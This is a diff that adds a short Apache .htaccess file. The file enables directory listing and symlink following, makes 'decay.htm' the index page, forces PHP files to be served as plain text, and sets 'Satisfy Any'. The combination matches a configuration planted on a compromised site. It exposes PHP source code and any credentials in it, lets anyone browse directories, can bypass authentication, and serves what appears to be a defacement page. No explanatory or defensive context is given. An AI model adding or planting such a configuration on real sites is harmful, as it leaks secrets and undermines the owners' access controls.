@@ -1,0 +1,5 @@
+Options Indexes FollowSymLinks
+DirectoryIndex decay.htm
+AddType text/plain .php 
+AddHandler text/plain .php
+Satisfy Any
